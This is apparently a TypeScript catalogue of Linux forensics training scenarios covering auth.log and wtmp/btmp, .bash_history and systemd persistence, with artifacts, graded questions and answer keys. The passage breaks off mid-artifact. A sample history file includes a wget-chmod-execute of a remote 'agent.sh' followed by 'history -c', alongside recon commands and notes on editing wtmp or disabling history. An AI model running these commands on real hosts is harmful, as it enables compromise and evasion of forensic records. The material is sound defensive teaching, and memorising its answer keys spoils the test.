import { utf8 } from "./util";
import type { ScenarioSeed } from "./types";

// Linux forensic-artifact scenarios. Each one drills into a
// specific artifact (or small cluster of artifacts) that an
// analyst working a Linux host will see in the field. The bar is
// the same as the rest of the catalogue: every claim the student
// is graded on has to be provable from the artifacts as written,
// and every artifact has at least one trap that punishes
// over-claiming.

export const LINUX_FORENSICS_SCENARIOS: ScenarioSeed[] = [
  // ─── Difficulty 3 — single-artifact deep dive ────────────────
  {
    slug: "linux-auth-log-wtmp-login-attribution-001",
    title: "Linux auth.log + wtmp/btmp: Who Actually Logged In",
    summary:
      "sshd writes to auth.log, login writes to wtmp, failed attempts go to btmp. Triage a login window cleanly — and notice what each file does and doesn't prove.",
    skillAreas: ["df_artifacts", "linux_artifacts", "inference_discipline"],
    difficulty: 3,
    estimatedMinutes: 25,
    tags: ["dfir", "linux", "linux_artifacts", "df_artifacts", "inference_discipline"],
    lane: "linux_forensics",
    module: "Linux host triage",
    sequence: 1,
    brief: `
# Brief

A jump host (\`bastion-03\`, Ubuntu 22.04) saw a flurry of SSH
activity overnight. The on-call engineer flagged "lots of failed
logins for \`root\`" in the morning huddle. Your job: read the
three login-record artifacts together and produce a defensible
account of what actually happened, separating attempted from
successful, and interactive from session-replay.

## What each artifact does

- \`/var/log/auth.log\` — syslog stream that **sshd**,
  **sudo**, and **login** write to. Lines like \`Accepted
  password for ...\`, \`Failed password for ...\`,
  \`session opened for user ...\`. Plain text; rotated by
  logrotate (\`auth.log.1\`, \`auth.log.2.gz\`, ...).
- \`/var/log/wtmp\` — binary database of **successful logins
  and logouts** plus reboot/shutdown markers. Read with
  \`last\`. Format is \`utmp\` records (man 5 utmp).
- \`/var/log/btmp\` — binary database of **failed login
  attempts**. Read with \`lastb\`. Same record format as wtmp.
  Mode 600 root by default (lastb requires root).

## Common traps when reading these three together

- **btmp ≠ breach evidence.** Lines in btmp prove the
  attempt happened, not that the password worked.
  Confirmation of success requires a matching
  \`Accepted ...\` line in auth.log and the corresponding
  wtmp entry.
- **wtmp is easy to tamper with.** \`utmpdump wtmp > out\`,
  edit, \`utmpdump -r < out > wtmp\` — no checksum, no
  signature. Lines that should appear in auth.log but are
  missing from wtmp are a classic indicator of selective
  cleanup.
- **PAM session lines are not new logins.** A
  \`session opened\` line for an existing session (e.g., a
  \`su\` or \`sudo\` invocation) is bookkeeping, not an
  additional login. Counting these as logins inflates the
  number.
- **Timezone.** auth.log is local-time on most distros;
  wtmp/btmp records carry a UTC epoch internally but
  \`last\`/\`lastb\` print local time by default. Mixing the
  two without normalising is a frequent writeup error.

## Artifacts

- **auth-log-excerpt.txt** — \`/var/log/auth.log\` for the
  window of interest.
- **last-output.txt** — \`last -F\` against \`/var/log/wtmp\`
  (full timestamps).
- **lastb-output.txt** — \`lastb -F\` against
  \`/var/log/btmp\` (failed attempts).
- **host-context.json** — distro, time zone, logrotate
  config, sshd config snippet (\`PermitRootLogin no\`).

## Reporting framing

For ACI reporting, name what each artifact actually supports:
"failed authentication attempts for \`root\` from IP X" vs
"successful interactive login as \`devops\` from IP Y". The
two sit in different reporting buckets, and conflating them
(especially calling btmp lines a compromise) is the most
common avoidable error on this artifact family.
`.trim(),
    artifacts: [
      {
        ordinal: 1,
        displayName: "auth-log-excerpt.txt",
        kind: "text",
        mimeType: "text/plain; charset=utf-8",
        bytes: utf8(
          [
            "# /var/log/auth.log (excerpt, host=bastion-03, TZ=UTC)",
            "Oct 14 02:14:03 bastion-03 sshd[18821]: Failed password for root from 203.0.113.44 port 51022 ssh2",
            "Oct 14 02:14:08 bastion-03 sshd[18821]: Failed password for root from 203.0.113.44 port 51022 ssh2",
            "Oct 14 02:14:12 bastion-03 sshd[18821]: Failed password for root from 203.0.113.44 port 51022 ssh2",
            "Oct 14 02:14:12 bastion-03 sshd[18821]: Disconnecting authenticating user root 203.0.113.44 port 51022: Too many authentication failures [preauth]",
            "Oct 14 02:18:51 bastion-03 sshd[18904]: Failed password for invalid user admin from 203.0.113.44 port 51388 ssh2",
            "Oct 14 02:18:53 bastion-03 sshd[18904]: Failed password for invalid user admin from 203.0.113.44 port 51388 ssh2",
            "Oct 14 02:19:02 bastion-03 sshd[18904]: Connection closed by invalid user admin 203.0.113.44 port 51388 [preauth]",
            "Oct 14 03:02:11 bastion-03 sshd[19120]: Accepted publickey for devops from 198.51.100.22 port 55402 ssh2: ED25519 SHA256:Yk0xC3...",
            "Oct 14 03:02:11 bastion-03 sshd[19120]: pam_unix(sshd:session): session opened for user devops(uid=1500) by (uid=0)",
            "Oct 14 03:02:14 bastion-03 sudo: devops : TTY=pts/0 ; PWD=/home/devops ; USER=root ; COMMAND=/usr/bin/apt update",
            "Oct 14 03:02:14 bastion-03 sudo: pam_unix(sudo:session): session opened for user root(uid=0) by devops(uid=1500)",
            "Oct 14 03:02:31 bastion-03 sudo: pam_unix(sudo:session): session closed for user root",
            "Oct 14 03:14:48 bastion-03 sshd[19120]: pam_unix(sshd:session): session closed for user devops",
            "Oct 14 03:41:09 bastion-03 sshd[19402]: Accepted publickey for devops from 198.51.100.22 port 55988 ssh2: ED25519 SHA256:Yk0xC3...",
            "Oct 14 03:41:09 bastion-03 sshd[19402]: pam_unix(sshd:session): session opened for user devops(uid=1500) by (uid=0)",
            "Oct 14 03:55:22 bastion-03 sshd[19402]: pam_unix(sshd:session): session closed for user devops",
          ].join("\n") + "\n",
        ),
      },
      {
        ordinal: 2,
        displayName: "last-output.txt",
        kind: "text",
        mimeType: "text/plain; charset=utf-8",
        bytes: utf8(
          [
            "# last -F -f /var/log/wtmp (TZ=UTC; reverse chronological)",
            "devops   pts/1        198.51.100.22    Tue Oct 14 03:41:09 2026 - Tue Oct 14 03:55:22 2026  (00:14)",
            "devops   pts/0        198.51.100.22    Tue Oct 14 03:02:11 2026 - Tue Oct 14 03:14:48 2026  (00:12)",
            "reboot   system boot  6.5.0-21-generic Tue Oct 14 00:01:02 2026                             still running",
            "devops   pts/0        198.51.100.22    Mon Oct 13 21:08:44 2026 - Mon Oct 13 22:31:00 2026  (01:22)",
            "shutdown system down  6.5.0-21-generic Tue Oct 14 00:00:51 2026 - Tue Oct 14 00:01:02 2026  (00:00)",
            "",
            "wtmp begins Thu Oct  2 09:01:11 2026",
          ].join("\n") + "\n",
        ),
      },
      {
        ordinal: 3,
        displayName: "lastb-output.txt",
        kind: "text",
        mimeType: "text/plain; charset=utf-8",
        bytes: utf8(
          [
            "# lastb -F -f /var/log/btmp (TZ=UTC; reverse chronological)",
            "admin    ssh:notty    203.0.113.44     Tue Oct 14 02:18:53 2026 - Tue Oct 14 02:18:53 2026  (00:00)",
            "admin    ssh:notty    203.0.113.44     Tue Oct 14 02:18:51 2026 - Tue Oct 14 02:18:51 2026  (00:00)",
            "root     ssh:notty    203.0.113.44     Tue Oct 14 02:14:12 2026 - Tue Oct 14 02:14:12 2026  (00:00)",
            "root     ssh:notty    203.0.113.44     Tue Oct 14 02:14:08 2026 - Tue Oct 14 02:14:08 2026  (00:00)",
            "root     ssh:notty    203.0.113.44     Tue Oct 14 02:14:03 2026 - Tue Oct 14 02:14:03 2026  (00:00)",
            "",
            "btmp begins Thu Oct  2 09:01:11 2026",
          ].join("\n") + "\n",
        ),
      },
      {
        ordinal: 4,
        displayName: "host-context.json",
        kind: "json",
        mimeType: "application/json; charset=utf-8",
        bytes: utf8(
          JSON.stringify(
            {
              host: "bastion-03",
              os: "Ubuntu 22.04.4 LTS",
              kernel: "6.5.0-21-generic",
              timezone: "UTC",
              acquired_utc: "2026-10-14T09:00:00Z",
              sshd_config_excerpt: [
                "PermitRootLogin no",
                "PasswordAuthentication yes",
                "PubkeyAuthentication yes",
                "MaxAuthTries 3",
              ],
              logrotate: {
                target: "/var/log/auth.log",
                rotate: 7,
                schedule: "daily",
                compress: true,
              },
              note: "sshd refuses root logins entirely (PermitRootLogin no). Failed-root attempts in btmp prove the attempt was made; they do not prove a successful authentication, and no Accepted line for root appears in auth.log for the same window.",
            },
            null,
            2,
          ) + "\n",
        ),
      },
    ],
    questions: [
      {
        ordinal: 1,
        type: "multi_choice",
        weight: 2,
        promptMd:
          "Reading auth.log, wtmp (`last`), and btmp (`lastb`) **together** for 14 Oct, which statements are **proven**?",
        options: [
          {
            id: "root-failed-x3",
            label:
              "Three failed login attempts for `root` originated from `203.0.113.44` at 02:14:03 / 02:14:08 / 02:14:12 UTC; sshd disconnected the connection after the third.",
          },
          {
            id: "root-compromised",
            label:
              "`root` was successfully compromised from `203.0.113.44` because three failed attempts followed by a disconnect is the classic post-success signature; the disconnect line is how sshd terminates the existing pre-auth socket immediately after issuing the SSH_MSG_USERAUTH_SUCCESS, and operators can read that as success.",
          },
          {
            id: "devops-two-logins",
            label:
              "`devops` had two successful SSH sessions from `198.51.100.22` on 14 Oct, both via publickey (ED25519), totalling ~26 minutes of interactive time.",
          },
          {
            id: "devops-sudo-root",
            label:
              "Inside the first `devops` session, `devops` invoked `sudo apt update`, which opened a PAM session for `root` (uid=0) — that is a privilege transition, not a separate root login.",
          },
          {
            id: "admin-account-exists",
            label:
              "An `admin` account exists on this host and was used for an interactive login from `203.0.113.44`; the btmp entries for `admin` mean the account record was resolved successfully and the credentials were then verified against a real shadow entry on the host before the attempt was rejected.",
          },
        ],
        allowMultiple: true,
        expected: {
          type: "multi_choice",
          correctIds: ["root-failed-x3", "devops-two-logins", "devops-sudo-root"],
          allowMultiple: true,
        },
        debriefMd: [
          "**Proven:**",
          "",
          "- Three `Failed password for root` lines in auth.log from `203.0.113.44`, matched by three `root` rows in lastb at the same timestamps. The fourth line is sshd's `Disconnecting authenticating user root ...` — that's the disconnect *after* the MaxAuthTries cap, not after a success.",
          "- Two `Accepted publickey for devops` lines in auth.log matched by two `devops` rows in `last` with the same intervals (03:02–03:14 and 03:41–03:55).",
          "- The `sudo apt update` line is a privilege transition by the existing `devops` session — the PAM `session opened for user root by devops` is bookkeeping for sudo, not a fresh login.",
          "",
          "**Not proven:**",
          "",
          "- *`root` was successfully compromised* — there is **no** `Accepted ... for root` line, no `root` row in `last`, and `PermitRootLogin no` is set. The disconnect line follows the failures, not a success.",
          "- *`admin` account exists* — auth.log says `Failed password for invalid user admin`. The string `invalid user` means PAM did not find an account by that name; lastb records the *attempt*, not account validation.",
        ].join("\n"),
      },
      {
        ordinal: 2,
        type: "multi_choice",
        weight: 1,
        promptMd:
          "auth.log shows three `session opened` lines for `devops` on 14 Oct (two from sshd, one from sudo). How many interactive logins is that?",
        options: [
          {
            id: "three-logins",
            label:
              "Three. Each `session opened` line is a separate interactive login event by definition — PAM emits one per authenticated entry into a session, and counting them gives the canonical login total for a user-day.",
          },
          {
            id: "two-logins",
            label:
              "Two. The two sshd lines correspond to two distinct SSH sessions for `devops`; the sudo line is a privilege transition inside an existing session, not a separate login.",
          },
          {
            id: "one-login",
            label:
              "One. PAM coalesces multiple `session opened` lines from the same user into a single logical login session, and the wtmp record reflects the consolidated count.",
          },
          {
            id: "zero-confirmed-logins",
            label:
              "Zero confirmed logins; PAM `session opened` lines without a matching `Accepted` line on the same TTY cannot be counted as logins, and the lack of a TTY field on the sudo entry disqualifies the entire run.",
          },
        ],
        allowMultiple: false,
        expected: {
          type: "multi_choice",
          correctIds: ["two-logins"],
          allowMultiple: false,
        },
        debriefMd:
          "Two SSH sessions for `devops`, each backed by an `Accepted publickey` line and a corresponding `last` row. The `sudo apt update` PAM line is a privilege transition; sudo opens a PAM session for the target user (`root`) inside the caller's existing session. Counting it as a third login double-counts the same shell.",
      },
      {
        ordinal: 3,
        type: "multi_choice",
        weight: 1,
        promptMd:
          "Which corroborating evidence would best strengthen the **non-compromise** finding for `root`?",
        options: [
          {
            id: "shadow-mtime",
            label:
              "`/etc/shadow` mtime/ctime around the window (no change indicates no password reset by the attempted-success path).",
          },
          {
            id: "wtmp-no-root",
            label:
              "`last root` output (a successful root login would appear in wtmp; absence is consistent with `PermitRootLogin no`).",
          },
          {
            id: "sudo-log",
            label:
              "`/var/log/sudo.log` or `journalctl _COMM=sudo` showing no sudo invocations as `root`-from-`root` in the window.",
          },
          {
            id: "journal-sshd",
            label:
              "`journalctl -u ssh` for the same window (independent of `/var/log/auth.log` — confirms no `Accepted` for root).",
          },
          {
            id: "iptables-counters",
            label:
              "Current `iptables -L -nv` counters (proves nothing about a past login because the counters are cumulative since boot and tell you nothing about authentication outcomes).",
          },
        ],
        allowMultiple: true,
        expected: {
          type: "multi_choice",
          correctIds: ["shadow-mtime", "wtmp-no-root", "journal-sshd"],
          allowMultiple: true,
        },
        debriefMd: [
          "`last root` and `journalctl -u ssh` are the strongest independent checks for a successful root login. `/etc/shadow` mtime is a weak but cheap supporting signal.",
          "",
          "`sudo.log` is not relevant — the question is whether `root` *logged in*, not whether someone used `sudo`. `iptables` packet counters are cumulative-since-boot and have no bearing on authentication outcomes.",
        ].join("\n"),
      },
      {
        ordinal: 4,
        type: "confidence",
        weight: 1,
        promptMd:
          "Confidence (1–5) that `203.0.113.44` is the **same operator** who later authenticated as `devops` from `198.51.100.22`, based ONLY on these three artifacts.",
        expected: { type: "confidence", expectedRange: [1, 2] },
        debriefMd:
          "**1–2.** The two source IPs differ, the auth methods differ (password vs publickey), and the username differs. Without independent linkage (EDR session correlation, TLS fingerprint, netflow), claiming the same operator is a leap. The artifacts as written do not connect the two windows.",
      },
    ],
  },

  // ─── Difficulty 3 — single-artifact deep dive ────────────────
  {
    slug: "linux-bash-history-execution-evidence-001",
    title: "Linux .bash_history: What It Proves and What It Doesn't",
    summary:
      "Per-user shell history is one of the loudest execution artifacts on a Linux host. Read it carefully — the file is trivially editable and incomplete by design.",
    skillAreas: ["df_artifacts", "linux_artifacts", "inference_discipline"],
    difficulty: 3,
    estimatedMinutes: 25,
    tags: ["dfir", "linux", "linux_artifacts", "df_artifacts", "inference_discipline"],
    lane: "linux_forensics",
    module: "Linux host triage",
    sequence: 2,
    brief: `
# Brief

A web-tier host (\`web-07\`, Debian 12) has a stale shell that
\`devops\` left running for 36 hours; an analyst on the
incident-response team pulled the per-user history files for
two accounts of interest (\`devops\`, \`appsvc\`) plus the host
context. Your task is to read the history files like a forensic
analyst — not like an operator who trusts the prompt — and
report what they actually prove.

## What \`.bash_history\` is

Each user account has a history file at
\`~/.bash_history\` written by bash. By default it is appended
to on shell **exit** — not in real time — and capped at
\`HISTSIZE\` (default 500) in-memory entries and
\`HISTFILESIZE\` (default 500) on-disk entries. Timestamps are
NOT recorded unless \`HISTTIMEFORMAT\` is set; when set,
bash prepends a \`#<epoch>\\n\` line before each command.

## Why it's tricky

- **Append-on-exit.** A long-running shell that has not exited
  has its in-memory history; the file on disk does not reflect
  it. Killing bash with SIGKILL skips the write entirely.
- **Trivially editable.** \`.bash_history\` is owned by the
  user (mode 600 typically). Any user with write access can
  rewrite, truncate, or delete the file.
- **Bypassable in real time.** Setting
  \`HISTFILE=/dev/null\` or \`unset HISTFILE\` in the shell
  stops writes from that point. \`export HISTCONTROL=ignorespace\`
  drops any command prefixed with a space.
- **Per-shell, per-user.** \`zsh\`, \`fish\`, and other shells
  use their own history files. Commands run via \`ssh
  user@host 'cmd'\` or \`cron\` do not populate
  \`.bash_history\`. Commands run inside a \`screen\` or
  \`tmux\` session land in the *attaching shell's* history.
- **Order is append-order, not execution-order**, when multiple
  concurrent shells write. \`shopt histappend\` mitigates by
  appending instead of overwriting, but timestamps drift when
  HISTTIMEFORMAT is unset.

## Artifacts

- **devops-bash-history.txt** — \`/home/devops/.bash_history\`
  (HISTTIMEFORMAT is set on this account).
- **appsvc-bash-history.txt** — \`/home/appsvc/.bash_history\`
  (HISTTIMEFORMAT is NOT set on this account).
- **host-context.json** — distro, mount options, per-user
  shell config notes (\`HISTSIZE\`, \`HISTFILE\` overrides).

## Reporting framing

\`.bash_history\` reads support findings of the form
"commands recorded under the \`<user>\` shell history at
<time>" — not "the user executed X". The two are different.
Tampered, truncated, or absent entries are evidence of
*non-recording*, not of *non-execution*. Pair history with
auditd / process accounting / sudo log before promoting a
finding to "the user executed".
`.trim(),
    artifacts: [
      {
        ordinal: 1,
        displayName: "devops-bash-history.txt",
        kind: "text",
        mimeType: "text/plain; charset=utf-8",
        bytes: utf8(
          // HISTTIMEFORMAT="%F %T " — epoch comments interleave with commands.
          [
            "#1760433020",
            "cd /var/www",
            "#1760433028",
            "ls -la",
            "#1760433055",
            "sudo systemctl status nginx",
            "#1760433102",
            "tail -n 200 /var/log/nginx/error.log",
            "#1760433330",
            "vi /etc/nginx/sites-available/app.conf",
            "#1760433520",
            "sudo nginx -t",
            "#1760433535",
            "sudo systemctl reload nginx",
            "#1760433900",
            "curl -sS https://app.example.internal/healthz",
            "#1760434120",
            "exit",
            "#1760520400",
            "cd /tmp",
            "#1760520415",
            "wget http://203.0.113.44/agent.sh",
            "#1760520422",
            "chmod +x agent.sh",
            "#1760520428",
            "./agent.sh --quiet",
            "#1760520500",
            "history -c",
            "#1760520510",
            "exit",
          ].join("\n") + "\n",
        ),
      },
      {
        ordinal: 2,
        displayName: "appsvc-bash-history.txt",
        kind: "text",
        mimeType: "text/plain; charset=utf-8",
        bytes: utf8(
          // No HISTTIMEFORMAT on this account — bare commands, no epoch lines.
          [
            "id",
            "uname -a",
            "ls /home",
            "cat /etc/passwd",
            "ps auxf",
            "ss -tlnp",
            "find / -perm -4000 -type f 2>/dev/null",
            "crontab -l",
            "exit",
          ].join("\n") + "\n",
        ),
      },
      {
        ordinal: 3,
        displayName: "host-context.json",
        kind: "json",
        mimeType: "application/json; charset=utf-8",
        bytes: utf8(
          JSON.stringify(
            {
              host: "web-07",
              os: "Debian 12 (bookworm)",
              timezone: "UTC",
              acquired_utc: "2026-10-15T09:00:00Z",
              accounts: [
                {
                  user: "devops",
                  uid: 1500,
                  shell: "/bin/bash",
                  history_settings: {
                    HISTTIMEFORMAT: "%F %T ",
                    HISTSIZE: 5000,
                    HISTFILESIZE: 5000,
                    HISTCONTROL: "ignoredups",
                  },
                  notes: "Interactive sysadmin account; uses sudo for elevation.",
                },
                {
                  user: "appsvc",
                  uid: 1801,
                  shell: "/bin/bash",
                  history_settings: {
                    HISTTIMEFORMAT: null,
                    HISTSIZE: 500,
                    HISTFILESIZE: 500,
                    HISTCONTROL: "ignoredups",
                  },
                  notes: "Service account for the application; should not log in interactively.",
                },
              ],
              note: "/home is on a separate ext4 partition mounted with relatime,nodev,nosuid. bash_history files are user-owned mode 600.",
            },
            null,
            2,
          ) + "\n",
        ),
      },
    ],
    questions: [
      {
        ordinal: 1,
        type: "multi_choice",
        weight: 2,
        promptMd:
          "From the `devops` history alone, which of these is the **most defensible** writeup of the late-segment activity (`wget agent.sh ... history -c`)?",
        options: [
          {
            id: "ran-malware",
            label:
              "The `devops` user downloaded and executed a malware agent from `203.0.113.44`, then attempted to cover their tracks with `history -c`. The sequence is unambiguous and the attribution is to the user.",
          },
          {
            id: "shell-history-recorded",
            label:
              "Commands recorded in the `devops` shell history at the timestamps shown indicate a `wget` of `agent.sh` from `203.0.113.44`, a `chmod +x`, an invocation, and a subsequent `history -c`. Whether `devops` personally ran them requires session-level corroboration.",
          },
          {
            id: "definitely-tampered",
            label:
              "Because `history -c` is present, the file should be considered entirely tampered and disregarded; nothing in this history is reliable enough to enter into a report under the controls expected of forensic evidence.",
          },
          {
            id: "exit-code-success",
            label:
              "`agent.sh` ran successfully because the next history line shows `history -c` rather than an error indicator; bash records command exit codes inline with each entry, so the absence of an error keyword confirms a clean run.",
          },
        ],
        allowMultiple: false,
        expected: {
          type: "multi_choice",
          correctIds: ["shell-history-recorded"],
          allowMultiple: false,
        },
        debriefMd:
          "`.bash_history` records *what bash wrote*, not what the user did. The defensible framing is \"commands recorded under the `devops` history at <time>\". A session-level link (auth.log SSH session, sudoers usage, TTY tracking, EDR) is what promotes \"recorded\" to \"the user executed\". `history -c` clears in-memory history; it doesn't retroactively imply tampering of all preceding entries, nor does bash record exit codes in history.",
      },
      {
        ordinal: 2,
        type: "multi_choice",
        weight: 1,
        promptMd:
          "The `appsvc` history shows recon-style commands (`id`, `cat /etc/passwd`, `find / -perm -4000`). Given the host context, what does this **prove**?",
        options: [
          {
            id: "service-account-compromised",
            label:
              "The `appsvc` service account is compromised by an external actor performing privilege-escalation reconnaissance, and the lack of timestamps is itself the giveaway that the operator deliberately suppressed HISTTIMEFORMAT to evade timeline analysis.",
          },
          {
            id: "interactive-shell-used",
            label:
              "An interactive bash shell ran under the `appsvc` UID and wrote recon-style commands to its history file; `appsvc` was not supposed to be used interactively per the host context.",
          },
          {
            id: "find-completed",
            label:
              "The `find / -perm -4000` command completed successfully and returned SUID binaries; bash records the result set inline with the command, so the analyst can read the SUID list directly from the history file alongside the command text.",
          },
          {
            id: "no-such-thing",
            label:
              "Nothing — `.bash_history` is unreliable evidence and bare command lines without HISTTIMEFORMAT cannot support any finding stronger than \"this file has bytes in it\" given how easy it is to rewrite the file.",
          },
        ],
        allowMultiple: false,
        expected: {
          type: "multi_choice",
          correctIds: ["interactive-shell-used"],
          allowMultiple: false,
        },
        debriefMd:
          "The file's existence and content prove a bash shell ran under `appsvc`'s UID and wrote these commands to its per-user history. That is significant given `appsvc` is documented as non-interactive. It does **not** prove who was at the keyboard, nor that the operator suppressed HISTTIMEFORMAT (the default is unset). bash does not record exit codes or command output in history.",
      },
      {
        ordinal: 3,
        type: "multi_choice",
        weight: 1,
        promptMd:
          "Which corroborating sources would best harden the `appsvc` finding?",
        options: [
          { id: "auth-log-appsvc", label: "`/var/log/auth.log` for `appsvc` session lines and source IP." },
          { id: "auditd-execve", label: "auditd `execve` events for processes under `appsvc`'s UID." },
          { id: "sudo-log-appsvc", label: "`sudo` log entries for `appsvc` (escalation attempts)." },
          { id: "lastlog-appsvc", label: "`lastlog -u appsvc` (last interactive login timestamp)." },
          { id: "dmesg", label: "`dmesg` ring buffer (kernel messages — unrelated to user-shell execution evidence)." },
        ],
        allowMultiple: true,
        expected: {
          type: "multi_choice",
          correctIds: ["auth-log-appsvc", "auditd-execve", "sudo-log-appsvc", "lastlog-appsvc"],
          allowMultiple: true,
        },
        debriefMd: [
          "auth.log + lastlog tie a shell to an authenticated session (or prove no login record exists, which is itself a finding). auditd execve and sudo log capture command execution and elevation independently of bash. ",
          "",
          "`dmesg` is a kernel ring buffer — disk-attach, OOM kills, USB events. It does not record user shell execution.",
        ].join("\n"),
      },
      {
        ordinal: 4,
        type: "confidence",
        weight: 1,
        promptMd:
          "Confidence (1–5) that `agent.sh` executed at `2026-10-15T09:00:28Z` based ONLY on the `devops` history line and its preceding `#1760520428` epoch comment.",
        expected: { type: "confidence", expectedRange: [2, 3] },
        debriefMd:
          "**2–3.** The `#1760520428` comment is what bash writes when HISTTIMEFORMAT is set, but the timestamp is the time bash wrote the line, not the time the command finished. Long-running commands, sudo prompts, and edits while the command is open all shift the gap between *issued* and *recorded*. And because the file is user-writable, the timestamp itself is editable. The disciplined finding is \"bash recorded this command around <time>\" with confidence 2–3; reserve 4–5 for cases corroborated by auditd, EDR, or a TTY-recording artifact.",
      },
    ],
  },

  // ─── Difficulty 4 — multi-artifact persistence triage ─────────
  {
    slug: "linux-systemd-persistence-units-timers-001",
    title: "Linux systemd Persistence: Units, Timers, and the Drop-Ins You Missed",
    summary:
      "systemd is now the dominant Linux persistence surface. Triage units + timers + drop-ins and tell what's actually scheduled to run, on what schedule, as which user.",
    skillAreas: [
      "df_artifacts",
      "linux_artifacts",
      "inference_discipline",
    ],
    difficulty: 4,
    estimatedMinutes: 40,
    tags: [
      "dfir",
      "linux",
      "linux_artifacts",
      "df_artifacts",
      "persistence",
      "inference_discipline",
    ],
    lane: "linux_forensics",
    module: "Linux host triage",
    sequence: 3,
    brief: `
# Brief

A host (\`db-replica-02\`, Rocky Linux 9) was flagged because
its outbound bytes-per-day jumped 4× three days ago and has
held the new baseline. EDR showed nothing process-name-wise; the
egress was attributed to a Python interpreter. You've pulled
the systemd unit / timer / drop-in inventory plus
\`systemctl list-timers\` to find what's scheduled, and the
auditd-stamped \`journalctl\` excerpt for the same window.

## What's where, in one slide

- \`/etc/systemd/system/\` — operator-installed system units.
  Highest precedence after \`/run/\`.
- \`/run/systemd/system/\` — runtime units. Gone on reboot.
- \`/usr/lib/systemd/system/\` (sometimes
  \`/lib/systemd/system/\`) — vendor / package-installed
  units.
- \`<unit>.d/\` directories — **drop-in overrides**. Any file
  in a drop-in directory is merged into the parent unit. A
  five-line drop-in can quietly change a unit's
  \`ExecStart=\`, \`User=\`, or
  \`Environment=\` without modifying the parent file.
- \`/home/<user>/.config/systemd/user/\` — **per-user** units
  managed by \`systemd --user\`. Run as that user when their
  user-instance is active (linger flag, console login, etc.).
- \`*.timer\` — schedules a matching \`*.service\` via
  \`OnCalendar=\`, \`OnBootSec=\`, \`OnUnitActiveSec=\`. Read
  the timer for the schedule, the unit for what runs.

## Common traps

- **Drop-ins beat parents.** A clean-looking vendor unit can
  be hijacked by a single drop-in file the analyst didn't
  list. \`systemctl cat <unit>\` shows the *effective*
  merged content. \`systemd-delta\` lists overridden units.
- **User units are real persistence.** A user unit with
  \`linger\` enabled runs even when the user is not logged
  in. Easy to miss if the inventory only looks at system
  units.
- **\`enabled\` ≠ \`active\`.** A unit can be enabled (will
  start on next boot / trigger) and not currently running, or
  active and not enabled. The two checks answer different
  questions.
- **Timers don't say what runs.** \`list-timers\` shows
  \`NEXT / LEFT / LAST / PASSED / UNIT / ACTIVATES\`. The
  ACTIVATES column is the service unit; that's what you need
  to read to know what actually executes.

## Artifacts

- **systemctl-list-units-state-enabled.txt** — output of
  \`systemctl list-units --type=service --state=loaded\`.
- **systemctl-list-timers.txt** —
  \`systemctl list-timers --all\`.
- **etc-systemd-system-inventory.txt** — \`ls -la\` walk of
  \`/etc/systemd/system/\` including drop-in directories.
- **suspicious-unit-and-dropin.txt** — \`systemctl cat\` of
  the unit + drop-in pair under suspicion.
- **journalctl-suspect-window.txt** — \`journalctl -u\`
  excerpt for the suspect unit across the 4× egress window.
- **host-context.json** — distro, suspect user's linger
  state, /home mount options.
`.trim(),
    artifacts: [
      {
        ordinal: 1,
        displayName: "systemctl-list-units-state-enabled.txt",
        kind: "text",
        mimeType: "text/plain; charset=utf-8",
        bytes: utf8(
          [
            "# systemctl list-units --type=service --state=loaded (excerpt; db-replica-02)",
            "UNIT                                LOAD   ACTIVE SUB     DESCRIPTION",
            "auditd.service                      loaded active running Security Auditing Service",
            "chronyd.service                     loaded active running NTP client/server",
            "mariadb.service                     loaded active running MariaDB 10.11 database server",
            "node_exporter.service               loaded active running Prometheus Node Exporter",
            "sshd.service                        loaded active running OpenSSH server daemon",
            "telemetry-agent.service             loaded active running Telemetry Agent (vendor)",
            "user@1700.service                   loaded active running User Manager for UID 1700",
            "",
            "LOAD   = Reflects whether the unit definition was properly loaded.",
            "ACTIVE = The high-level unit activation state, i.e. generalization of SUB.",
            "SUB    = The low-level unit activation state.",
          ].join("\n") + "\n",
        ),
      },
      {
        ordinal: 2,
        displayName: "systemctl-list-timers.txt",
        kind: "text",
        mimeType: "text/plain; charset=utf-8",
        bytes: utf8(
          [
            "# systemctl list-timers --all (db-replica-02, TZ=UTC)",
            "NEXT                          LEFT        LAST                          PASSED      UNIT                          ACTIVATES",
            "Wed 2026-10-15 02:00:00 UTC   16h left    Tue 2026-10-14 02:00:00 UTC   7h ago      logrotate.timer               logrotate.service",
            "Wed 2026-10-15 03:10:00 UTC   17h left    Tue 2026-10-14 03:10:00 UTC   6h ago      dnf-makecache.timer           dnf-makecache.service",
            "Wed 2026-10-15 09:30:00 UTC   30m left    Tue 2026-10-14 23:30:00 UTC   10h ago     telemetry-agent.timer         telemetry-agent.service",
            "n/a                           n/a         Tue 2026-10-14 08:55:00 UTC   5m ago      sync-cleanup.timer            sync-cleanup.service",
            "",
            "5 timers listed.",
          ].join("\n") + "\n",
        ),
      },
      {
        ordinal: 3,
        displayName: "etc-systemd-system-inventory.txt",
        kind: "text",
        mimeType: "text/plain; charset=utf-8",
        bytes: utf8(
          [
            "# ls -la /etc/systemd/system/ (recursive on drop-ins)",
            "total 36",
            "drwxr-xr-x.  9 root root 4096 Oct 11 23:18 .",
            "drwxr-xr-x. 78 root root 4096 Oct 10 11:02 ..",
            "drwxr-xr-x.  2 root root 4096 Oct 11 23:18 telemetry-agent.service.d",
            "lrwxrwxrwx.  1 root root   45 Aug 04 14:55 multi-user.target.wants/mariadb.service -> /usr/lib/systemd/system/mariadb.service",
            "lrwxrwxrwx.  1 root root   42 Aug 04 14:55 multi-user.target.wants/sshd.service -> /usr/lib/systemd/system/sshd.service",
            "lrwxrwxrwx.  1 root root   44 Aug 04 14:55 multi-user.target.wants/auditd.service -> /usr/lib/systemd/system/auditd.service",
            "lrwxrwxrwx.  1 root root   54 Sep 28 10:01 multi-user.target.wants/telemetry-agent.service -> /usr/lib/systemd/system/telemetry-agent.service",
            "",
            "# ls -la /etc/systemd/system/telemetry-agent.service.d/",
            "total 8",
            "drwxr-xr-x. 2 root root 4096 Oct 11 23:18 .",
            "drwxr-xr-x. 9 root root 4096 Oct 11 23:18 ..",
            "-rw-r--r--. 1 root root  214 Oct 11 23:18 override.conf",
            "",
            "# ls -la /home/dbops/.config/systemd/user/ 2>/dev/null",
            "total 12",
            "drwxr-xr-x. 2 dbops dbops 4096 Oct 12 00:03 .",
            "drwx------. 3 dbops dbops 4096 Oct 12 00:03 ..",
            "-rw-r--r--. 1 dbops dbops  238 Oct 12 00:03 sync-cleanup.service",
            "-rw-r--r--. 1 dbops dbops  142 Oct 12 00:03 sync-cleanup.timer",
          ].join("\n") + "\n",
        ),
      },
      {
        ordinal: 4,
        displayName: "suspicious-unit-and-dropin.txt",
        kind: "text",
        mimeType: "text/plain; charset=utf-8",
